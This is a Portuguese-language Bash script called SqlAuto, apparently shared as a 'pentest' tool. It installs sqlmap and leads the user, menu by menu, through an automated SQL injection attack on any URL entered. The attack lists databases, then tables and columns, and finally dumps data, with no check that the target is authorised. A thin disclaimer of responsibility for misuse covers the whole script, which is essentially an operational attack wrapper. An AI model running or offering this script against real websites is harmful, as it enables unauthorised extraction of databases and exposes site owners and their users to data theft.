#!/bin/bash
#Script Coded By:  ( MaryenSecurity )
#Repostado e Restruturado por
#     Lørd Channel...
#Contato: +55 62 9547-5750
#Creditos: ( RyanGarccia )
#Script para pentesters (uso educacional ou testes)
#Não me responsabilizo por mal uso !
#https://github.com/lordsaulo
#
#
#
clear
#abreviamentos
red='\033[1;91m'
green='\033[1;92m'
white='\033[1;97m'
echo '\033[1;97m     ___'
echo '\033[1;97m    __H__   _____        _____         __'
echo '     [\033[1;91m█\033[1;97m]   / ___/ ____ _/ /   | __  __/ /_____'
echo '     [\033[1;91m█\033[1;97m]   \__ \ / __ `/ / /| |/ / / / __/ __ \'
echo '     [\033[1;91m█\033[1;97m]   ___/ / /_/ / / ___ / /_/ / /_/ /_/ /'
echo '     [\033[1;91m█\033[1;97m]  /____/\__, /_/_/  |_\__,_/\__/\____/'
echo '      v           /_/'
echo "$white                                 @RyanGarccia"
echo
echo "$red{1}~>> $white INSTALAR SQLMAP..."
echo
echo "$red{2}~>> $white USAR SQLMAP AUTOMÁTICO..."
echo
echo "$red{3}~>> $white Sair..."
echo "$white"
read -p "{SqlAuto}~>> " opcao
case $opcao in
#
1)
clear
echo "$red	INSTALANDO SQLMAP ...";sleep 2
git clone https://github.com/sqlmapproject/sqlmap
mv -v sqlmap $HOME
echo "$red	SQLMAP INSTALADO COM SUCESSO...!!!";sleep 2
#
$SqlAuto sh sqlauto.sh
;;

2)
clear
#
cd $HOME ; cd sqlmap
#
echo "$red	INICIANDO SQLMAP AUTOMATICO...";sleep 2
echo
echo
#
echo "$red	DIGITE A URL PARA O SQLMAP..."
echo
echo "$white"
read -p "{SqlAuto}~>> " url
#
python2 sqlmap.py -u $url --risk 2 --level 2 --batch --dbs
#
echo "$red	DIGITE O NOME DA <•>DATABASE<•>"
echo
echo "$white"
read -p "{SqlAuto}~>> " db
#
python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db --tables
#
echo "$red	DIGITE O NOME DA <•>TABELA<•>"
echo
echo "$white"
read -p "{SqlAuto}~>> " tabela
#
python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela --columns
#
echo "$red	DIGITE O NOME DA <•>COLUNA<•>"
echo
echo "$white"
read -p "{SqlAuto}~>> " coluna
#
python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela -C $coluna --dump
#Tudo Feito!
#Thank you
#
echo "$red	Obrigado por utilizar o nosso script..."
;;

3)
echo
echo "    Obrigado por utilizar o SqlAuto..."
echo
;;

*)
echo " Opção invalida, Reiniando em..."
sleep 1
echo "               3"
sleep 1
echo "               2"
sleep 1
echo "               1"
sleep 1
$SqlAuto sh sqlauto.sh
;;

esac
